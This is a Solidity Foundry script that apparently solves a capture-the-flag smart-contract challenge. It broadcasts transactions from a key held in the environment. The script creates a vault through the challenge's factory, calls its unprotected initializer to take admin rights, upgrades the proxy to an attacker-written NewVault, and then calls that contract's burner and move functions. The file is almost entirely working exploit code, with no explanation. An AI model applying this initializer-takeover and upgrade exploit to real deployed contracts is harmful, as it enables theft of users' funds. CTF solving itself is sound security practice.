// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Challenge.sol";
import "../test/Counter.t.sol";

contract CounterScript is Script {
    Challenge challenge = Challenge(0xDbC006916Ee687844930B0271D0aE5F84eFE4308);

    function setUp() public {}

    function run() public {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        VmSafe.Wallet memory wallet = vm.createWallet(deployerPrivateKey);

        address deployer = wallet.addr;
        address player = deployer;
        console.log("deployer: %s", deployer);
        console.log("eth balance: %e", player.balance);
        console.log("codesize", address(challenge.vault()).code.length);

        vm.startBroadcast(deployerPrivateKey);

        // Solver solver = new Solver(address(challenge));
        // challenge.hexensCoin().approve(address(solver), type(uint256).max);
        // solver.solve();
        // console.log("solver: %s", address(solver));

        // Solver solver = Solver(address(0xE7a9526Bea2C1fBCd1D4131C8611a0053916DB64));
        // solver.solveStep2();
        NewVault newVault = new NewVault();
        Vault vault = challenge.vaultFactory().createVault(
            keccak256("The tea in Nepal is very hot. But the coffee in Peru is much hotter.")
        );
        vault.initialize(address(challenge.diamond()), address(challenge.hexensCoin()));
        //now we get admin. just upgrade
        vault.upgradeTo(address(newVault));
        NewVault vaultV2 = NewVault(address(vault));
        vaultV2.newBurner();
        vaultV2.move(address(newVault));

        console.log("isSolved: %s", challenge.isSolved());
        vm.stopBroadcast();
    }
}
